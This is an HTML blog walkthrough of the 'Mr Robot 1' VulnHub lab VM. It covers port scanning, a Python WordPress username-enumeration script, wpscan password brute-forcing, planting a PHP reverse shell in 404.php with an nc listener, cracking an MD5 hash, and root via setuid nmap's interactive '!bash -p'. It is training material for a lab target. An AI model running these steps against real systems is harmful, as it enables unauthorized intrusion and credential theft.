<!-- HTML generated using hilite.me --><br /><i>Mr Robot 1 VM can be downloaded <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank">here</a>. </i><br /><h2>0. Get VMs IP</h2>Netdiscover didn't reveal the VM, so I did a quick nmap scan.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> nmap 192.168.1.0/24 -F<br /><br /><span style="color: #888888;">Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-20 15:25 EST</span><br /><span style="color: #888888;">Stats: 0:00:25 elapsed; 253 hosts completed (2 up), 2 undergoing SYN Stealth Scan</span><br /><br /><span style="color: #888888;">...</span><br /><br /><span style="color: #888888;">Nmap scan report for 192.168.1.72</span><br /><span style="color: #888888;">Host is up (0.00015s latency).</span><br /><span style="color: #888888;">Not shown: 97 filtered ports</span><br /><span style="color: #888888;">PORT    STATE  SERVICE</span><br /><span style="color: #888888;">22/tcp  closed ssh</span><br /><span style="color: #888888;">80/tcp  open   http</span><br /><span style="color: #888888;">443/tcp open   https</span><br /><span style="color: #888888;">MAC Address: 08:00:27:CE:C4:AA (Oracle VirtualBox virtual NIC)</span><br /><br /><span style="color: #888888;">Nmap scan report for 192.168.1.73</span><br /><span style="color: #888888;">Host is up (0.0000010s latency).</span><br /><span style="color: #888888;">All 100 scanned ports on 192.168.1.73 are closed</span><br /><br /><span style="color: #888888;">Nmap done: 256 IP addresses (3 hosts up) scanned in 26.55 seconds</span><span style="color: black; font-style: italic;"><br /></span></pre></div><h2>1. Enumeration&nbsp;</h2><h4>TCP Ports enumeration </h4><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> nmap -sV 192.168.1.72<br /><br /><span style="color: #888888;">Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-20 15:27 EST</span><br /><span style="color: #888888;">Nmap scan report for 192.168.1.72</span><br /><span style="color: #888888;">Host is up (0.00014s latency).</span><br /><span style="color: #888888;">Not shown: 997 filtered ports</span><br /><span style="color: #888888;">PORT    STATE  SERVICE  VERSION</span><br /><span style="color: #888888;">22/tcp  closed ssh</span><br /><span style="color: #888888;">80/tcp  open   http     Apache httpd</span><br /><span style="color: #888888;">443/tcp open   ssl/http Apache httpd</span><br /><span style="color: #888888;">MAC Address: 08:00:27:CE:C4:AA (Oracle VirtualBox virtual NIC)</span><br /><br /><span style="color: #888888;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /></pre></div><br />Nothing impressive, we didn't even find any extra services running than the ones we found using -F earlier.<br /><h2>2. Web server </h2>Sourcecode doesn't reveal much, and it feels like some ad campaign for Mr Robot series. I decided to ignore it and look for something that's actually useful.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> curl http://192.168.1.72/robots.txt<br /><span style="color: #888888;">User-agent: *</span><br /><span style="color: #888888;">fsocity.dic</span><br /><span style="color: #888888;">key-1-of-3.txt</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> curl http://192.168.1.72/key-1-of-3.txt<br /><span style="color: #888888;">073403c8a58a1f80d943455fb30724b9</span> </pre></div><br />We found our first key (<i>key-1-of-3.txt</i>). It contains what seems to be an MD5 hash but wasn't able to crack it.<br /><br /><i>fsocity.dic</i> looks like a wordlist to me, yet some words felt to be repeating over and over again, let's do some processing on it to remove the duplicates. <br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> wc -l fsocity.dic <br /><span style="color: #888888;">858160 fsocity.dic</span><br /><span style="color: navy; font-weight: bold;">root@kali:~#</span> cat fsocity.dic | sort | uniq &gt; fsociety_filtered.txt<br /><span style="color: navy; font-weight: bold;">root@kali:~#</span> wc -l fsociety_filtered.txt <br /><span style="color: #888888;">11451 fsociety_filtered.txt</span><br /><span style="color: navy; font-weight: bold;">root@kali:~#</span> <br /></pre></div><br />The filtered list's word count is exactly 1/74th of the unfiltered list size. Some likes to copy and paste.<br /><br />Next we'll use dirsearch to find any worthy directories.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> ./dirsearch/dirsearch.py -u http://192.168.1.72/ -e php -x 301,302,403<br /><br /><span style="color: #888888;"> _|. _ _  _  _  _ _|_    v0.3.7</span><br /><span style="color: #888888;">(_||| _) (/_(_|| (_| )</span><br /><br /><span style="color: #888888;">Extensions: php | Threads: 10 | Wordlist size: 5151</span><br /><br /><span style="color: #888888;">Error Log: /root/Desktop/dirsearch/logs/errors-17-01-20_15-55-07.log</span><br /><br /><span style="color: #888888;">Target: http://192.168.1.72/</span><br /><br /><span style="color: #888888;">[15:55:07] Starting: </span><br /><span style="color: #888888;">[15:55:30] 200 -    1KB - /admin/</span><br /><span style="color: #888888;">[15:55:30] 200 -    1KB - /admin/?/login</span><br /><span style="color: #888888;">[15:55:31] 200 -    1KB - /admin/index.html</span><br /><span style="color: #888888;">[15:55:56] 200 -    0B  - /favicon.ico</span><br /><span style="color: #888888;">[15:56:01] 200 -    1KB - /index.html</span><br /><span style="color: #888888;">[15:56:03] 200 -  504KB - /intro</span><br /><span style="color: #888888;">[15:56:05] 200 -   19KB - /license.txt</span><br /><span style="color: #888888;">[15:56:18] 200 -   10KB - /readme</span><br /><span style="color: #888888;">[15:56:18] 200 -   10KB - /readme.html</span><br /><span style="color: #888888;">[15:56:19] 200 -   41B  - /robots.txt</span><br /><span style="color: #888888;">[15:56:22] 200 -    0B  - /sitemap</span><br /><span style="color: #888888;">[15:56:22] 200 -    0B  - /sitemap.xml</span><br /><span style="color: #888888;">[15:56:22] 200 -    0B  - /sitemap.xml.gz</span><br /><span style="color: #888888;">[15:56:30] 200 -    0B  - /wp-config.php</span><br /><span style="color: #888888;">[15:56:31] 200 -    0B  - /wp-content/</span><br /><span style="color: #888888;">[15:56:31] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php</span><br /><span style="color: #888888;">[15:56:31] 200 -    3KB - /wp-login</span><br /><span style="color: #888888;">[15:56:31] 500 -    0B  - /wp-includes/rss-functions.php</span><br /><span style="color: #888888;">[15:56:31] 200 -    3KB - /wp-login/</span><br /><span style="color: #888888;">[15:56:31] 200 -    3KB - /wp-login.php</span><br /><br /><span style="color: #888888;">Task Completed</span><br /></pre></div><br />The website is powered by Wordpress, we'll use wpscan to enumerate the site.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> wpscan --url http://192.168.1.72/ --enumerate u<br /><span style="color: #888888;">_______________________________________________________________</span><br /><span style="color: #888888;">        __          _______   _____                  </span><br /><span style="color: #888888;">        \ \        / /  __ \ / ____|                 </span><br /><span style="color: #888888;">         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br /><span style="color: #888888;">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ </span><br /><span style="color: #888888;">           \  /\  /  | |     ____) | (__| (_| | | | |</span><br /><span style="color: #888888;">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br /><br /><span style="color: #888888;">        WordPress Security Scanner by the WPScan Team </span><br /><span style="color: #888888;">                       Version 2.9.2</span><br /><span style="color: #888888;">          Sponsored by Sucuri - https://sucuri.net</span><br /><span style="color: #888888;">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span><br /><span style="color: #888888;">_______________________________________________________________</span><br /><br /><span style="color: #888888;">[+] URL: http://192.168.1.72/</span><br /><span style="color: #888888;">[+] Started: Fri Jan 20 16:01:35 2017</span><br /><br /><span style="color: #888888;">[+] robots.txt available under: 'http://192.168.1.72/robots.txt'</span><br /><span style="color: #888888;">[!] The WordPress 'http://192.168.1.72/readme.html' file exists exposing a version number</span><br /><span style="color: #888888;">[+] Interesting header: SERVER: Apache</span><br /><span style="color: #888888;">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span><br /><span style="color: #888888;">[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523</span><br /><span style="color: #888888;">[+] XML-RPC Interface available under: http://192.168.1.72/xmlrpc.php</span><br /><br /><span style="color: #888888;">[+] WordPress version 4.3.7 (Released on 2017-01-11) identified from rss generator, rdf generator, atom generator, links opml</span><br /><br /><span style="color: #888888;">[+] Enumerating plugins from passive detection ...</span><br /><span style="color: #888888;">[+] No plugins found</span><br /><br /><span style="color: #888888;">[+] Enumerating usernames ...</span><br /><span style="color: #888888;">[+] We did not enumerate any usernames</span><br /><br /><span style="color: #888888;">[+] Finished: Fri Jan 20 16:01:36 2017</span><br /><span style="color: #888888;">[+] Requests Done: 57</span><br /><span style="color: #888888;">[+] Memory used: 10.797 MB</span><br /><span style="color: #888888;">[+] Elapsed time: 00:00:00</span></pre></div><br />That also didn't reveal anything useful. Let's check if any of the words provided in the list we found can be used as a username. Wordpress login can tell you if the username exists or not by trying to login and checking the error message.<br /><br /><blockquote class="tr_bq"><b>ERROR</b>: Invalid username. <a href="http://192.168.1.72/wp-login.php?action=lostpassword">Lost your password?</a></blockquote>I wrote a quick python script (with horrible performance) to find any existing usernames.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: green; font-weight: bold;">import</span> <span style="color: blue; font-weight: bold;">requests</span><br /><br />open_file <span style="color: #666666;">=</span> <span style="color: green;">open</span>(<span style="color: #ba2121;">'fsociety_filtered.txt'</span>, <span style="color: #ba2121;">'r'</span>)<br />temp <span style="color: #666666;">=</span> open_file<span style="color: #666666;">.</span>read()<span style="color: #666666;">.</span>splitlines()<br />count <span style="color: #666666;">=</span> <span style="color: #666666;">0</span><br /><span style="color: green; font-weight: bold;">for</span> username <span style="color: #aa22ff; font-weight: bold;">in</span> temp:<br />    payload <span style="color: #666666;">=</span> {<span style="color: #ba2121;">'log'</span>: <span style="color: #ba2121;">'{0}'</span><span style="color: #666666;">.</span>format(username), <span style="color: #ba2121;">'pwd'</span>: <span style="color: #ba2121;">'dummy'</span>}<br />    headers <span style="color: #666666;">=</span> {<span style="color: #ba2121;">'Content-Type'</span> : <span style="color: #ba2121;">'application/x-www-form-urlencoded'</span>}<br />    cookies <span style="color: #666666;">=</span> <span style="color: green;">dict</span>(wordpress_test_cookie<span style="color: #666666;">=</span><span style="color: #ba2121;">'WP+Cookie+check'</span>)<br />    r <span style="color: #666666;">=</span> requests<span style="color: #666666;">.</span>post(<span style="color: #ba2121;">"http://192.168.1.72/wp-login.php"</span>, data<span style="color: #666666;">=</span>payload, headers<span style="color: #666666;">=</span>headers, cookies<span style="color: #666666;">=</span>cookies)<br />    <span style="color: green; font-weight: bold;">if</span> <span style="color: #ba2121;">"Invalid username"</span> <span style="color: #aa22ff; font-weight: bold;">not</span> <span style="color: #aa22ff; font-weight: bold;">in</span> r<span style="color: #666666;">.</span>text:<br />        <span style="color: green; font-weight: bold;">print</span> username<br /></pre></div><br />Running it revealed that the user <b>elliot</b> exists.<br /><br />I used wpscan to do a dictionary attack using the same list.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> wpscan --url http://192.168.1.72 --wordlist<span style="color: #666666;">=</span>/root/Desktop/fsociety_filtered.txt --username elliot --threads 20<br /><span style="color: #888888;">_______________________________________________________________</span><br /><span style="color: #888888;">        __          _______   _____                  </span><br /><span style="color: #888888;">        \ \        / /  __ \ / ____|                 </span><br /><span style="color: #888888;">         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br /><span style="color: #888888;">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ </span><br /><span style="color: #888888;">           \  /\  /  | |     ____) | (__| (_| | | | |</span><br /><span style="color: #888888;">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br /><br /><span style="color: #888888;">        WordPress Security Scanner by the WPScan Team </span><br /><span style="color: #888888;">                       Version 2.9.2</span><br /><span style="color: #888888;">          Sponsored by Sucuri - https://sucuri.net</span><br /><span style="color: #888888;">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span><br /><span style="color: #888888;">_______________________________________________________________</span><br /><br /><span style="color: #888888;">[+] URL: http://192.168.1.72/</span><br /><span style="color: #888888;">[+] Started: Fri Jan 20 16:42:46 2017</span><br /><br /><span style="color: #888888;">[+] robots.txt available under: 'http://192.168.1.72/robots.txt'</span><br /><span style="color: #888888;">[!] The WordPress 'http://192.168.1.72/readme.html' file exists exposing a version number</span><br /><span style="color: #888888;">[+] Interesting header: SERVER: Apache</span><br /><span style="color: #888888;">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span><br /><span style="color: #888888;">[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523</span><br /><span style="color: #888888;">[+] XML-RPC Interface available under: http://192.168.1.72/xmlrpc.php</span><br /><br /><span style="color: #888888;">[+] WordPress version 4.3.7 (Released on 2017-01-11) identified from rss generator, rdf generator, atom generator, links opml</span><br /><br /><span style="color: #888888;">[+] Enumerating plugins from passive detection ...</span><br /><span style="color: #888888;">[+] No plugins found</span><br /><span style="color: #888888;">[+] Starting the password brute forcer</span><br /><span style="color: #888888;">  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                                                                                </span><br /><br /><span style="color: #888888;">  Brute Forcing 'elliot' Time: 00:01:07 &lt;================================================================                                                                    &gt; (5627 / 11452) 49.13%  ETA: 00:01:10</span><br /><span style="color: #888888;">  +----+--------+------+-----------+</span><br /><span style="color: #888888;">  | Id | Login  | Name | Password  |</span><br /><span style="color: #888888;">  +----+--------+------+-----------+</span><br /><span style="color: #888888;">  |    | elliot |      | <b>ER28-0652</b> |</span><br /><span style="color: #888888;">  +----+--------+------+-----------+</span><br /><br /><span style="color: #888888;">[+] Finished: Fri Jan 20 16:43:55 2017</span><br /><span style="color: #888888;">[+] Requests Done: 5679</span><br /><span style="color: #888888;">[+] Memory used: 18.219 MB</span><br /><span style="color: #888888;">[+] Elapsed time: 00:01:08</span><br /></pre></div><br />We found the password! It's <b><span style="color: #888888;">ER28-0652. </span></b><br /><br /><h2>3. Getting a shell</h2><b>elliot </b>has administrative access on WP, which means we can easily change 404.php file with a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell</a>. Go to <b>Appearance </b>-&gt; <b>Editor </b>and swap the <b>404.php</b> code with your modified revsh. Make sure you change the IP and PORT in the php file. Then start a listener and hit a random page like <i>http://192.168.1.72/kosomak</i>.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> nc -nvlp 4444<br /><span style="color: #888888;">listening on [any] 4444 ...</span><br /><span style="color: #888888;">connect to [192.168.1.73] from (UNKNOWN) [192.168.1.72] 41611</span><br /><span style="color: #888888;">Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br /><span style="color: #888888;"> 22:01:33 up  1:45,  0 users,  load average: 0.00, 0.04, 0.21</span><br /><span style="color: #888888;">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br /><span style="color: #888888;">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br /><span style="color: #888888;">/bin/sh: 0: can't access tty; job control turned off</span><br /><span style="color: navy; font-weight: bold;">$</span> python -c <span style="color: #ba2121;">'import pty; pty.spawn("/bin/bash")'</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/$</span> <br /></pre></div><br />After little enumeration I found the following:<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">daemon@linux:/$</span> <span style="color: green;">cd</span> /home<br /><span style="color: #888888;">cd /home</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/home$</span> ls -al<br /><span style="color: #888888;">ls -al</span><br /><span style="color: #888888;">total 12</span><br /><span style="color: #888888;">drwxr-xr-x  3 root root 4096 Nov 13  2015 .</span><br /><span style="color: #888888;">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br /><span style="color: #888888;">drwxr-xr-x  2 root root 4096 Nov 13  2015 robot</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/home$</span> <span style="color: green;">cd </span>robot<br /><span style="color: #888888;">cd robot</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/home/robot$</span> ls -al<br /><span style="color: #888888;">ls -al</span><br /><span style="color: #888888;">total 16</span><br /><span style="color: #888888;">drwxr-xr-x 2 root  root  4096 Nov 13  2015 .</span><br /><span style="color: #888888;">drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..</span><br /><span style="color: #888888;">-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt</span><br /><span style="color: #888888;">-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/home/robot$</span> cat password.raw-md5<br /><span style="color: #888888;">cat password.raw-md5</span><br /><span style="color: #888888;">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br /><span style="color: navy; font-weight: bold;">daemon@linux:/home/robot$</span> <br /></pre></div><br />A quick search revealed that the MD5 hash stands for <b><i><span id="decodedValue">abcdefghijklmnopqrstuvwxyz</span></i></b><br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">daemon@linux:/$</span> su - robot<br /><span style="color: #888888;">su - robot</span><br /><span style="color: #888888;">Password: abcdefghijklmnopqrstuvwxyz</span><br /><br /><span style="color: navy; font-weight: bold;">$</span> whoami<br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">robot</span><br /><span style="color: navy; font-weight: bold;">$</span> sudo -l<br /><span style="color: #888888;">sudo -l</span><br /><span style="color: #888888;">[sudo] password for robot: abcdefghijklmnopqrstuvwxyz</span><br /><br /><span style="color: #888888;">Sorry, user robot may not run sudo on linux.</span><br /><span style="color: navy; font-weight: bold;">$</span> ls<br /><span style="color: #888888;">ls</span><br /><span style="color: #888888;">key-2-of-3.txt password.raw-md5</span><br /><span style="color: navy; font-weight: bold;">$</span> cat key-2-of-3.txt<br /><span style="color: #888888;">cat key-2-of-3.txt</span><br /><span style="color: #888888;">822c73956184f694993bede3eb39f959</span><br /></pre></div><br />We found two keys, let's go for the last one.<br /><h2>4. Getting root</h2>Searching for setuid binaries is the answer.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">$</span> find / -user root -perm -4000 2&gt;/dev/null<br /><span style="color: #888888;">find / -user root -perm -4000 2&gt;/dev/null</span><br /><span style="color: #888888;">/bin/ping</span><br /><span style="color: #888888;">/bin/umount</span><br /><span style="color: #888888;">/bin/mount</span><br /><span style="color: #888888;">/bin/ping6</span><br /><span style="color: #888888;">/bin/su</span><br /><span style="color: #888888;">/usr/bin/passwd</span><br /><span style="color: #888888;">/usr/bin/newgrp</span><br /><span style="color: #888888;">/usr/bin/chsh</span><br /><span style="color: #888888;">/usr/bin/chfn</span><br /><span style="color: #888888;">/usr/bin/gpasswd</span><br /><span style="color: #888888;">/usr/bin/sudo</span><br /><span style="color: #888888;">/usr/local/bin/nmap</span><br /><span style="color: #888888;">/usr/lib/openssh/ssh-keysign</span><br /><span style="color: #888888;">/usr/lib/eject/dmcrypt-get-device</span><br /><span style="color: #888888;">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br /><span style="color: #888888;">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br /><span style="color: #888888;">/usr/lib/pt_chown</span><br /><span style="color: navy; font-weight: bold;">$</span> /usr/local/bin/nmap --version<br /><span style="color: #888888;">/usr/local/bin/nmap --version</span><br /><br /><span style="color: #888888;">nmap version 3.81 ( http://www.insecure.org/nmap/ )</span><br /></pre></div><br />Nmap isn't expected to have a setuid bit, I realized it's vulnerable to a priv escalation vulnerability: https://gist.github.com/dergachev/7916152<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">$</span> nmap --interactive<br /><span style="color: #888888;">nmap --interactive</span><br /><br /><span style="color: #888888;">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br /><span style="color: #888888;">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br /><span style="color: #888888;">nmap&gt; !whoami</span><br /><span style="color: #888888;">!whoami</span><br /><span style="color: #888888;">root</span><br /><span style="color: #888888;">waiting to reap child : No child processes</span><br /><span style="color: #888888;">nmap&gt; !bash -p</span><br /><span style="color: #888888;">!bash -p</span><br /><span style="color: #888888;">bash-4.3# whoami</span><br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">root</span><br /><span style="color: #888888;">bash-4.3# cd /root</span><br /><span style="color: #888888;">cd /root</span><br /><span style="color: #888888;">bash-4.3# ls -al</span><br /><span style="color: #888888;">ls -al</span><br /><span style="color: #888888;">total 32</span><br /><span style="color: #888888;">drwx------  3 root root 4096 Nov 13  2015 .</span><br /><span style="color: #888888;">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br /><span style="color: #888888;">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br /><span style="color: #888888;">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br /><span style="color: #888888;">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br /><span style="color: #888888;">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br /><span style="color: #888888;">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br /><span style="color: #888888;">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br /><span style="color: #888888;">bash-4.3# cat key-3-of-3.txt   </span><br /><span style="color: #888888;">cat key-3-of-3.txt</span><br /><span style="color: #888888;">04787ddef27c3dee1ee161b21670b4e4</span><br /></pre></div><br />Aaand we're done! Quite simple one.<br /><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=jP_H09VUZ8I">Agalloch - Summerisle Reprise</a></i>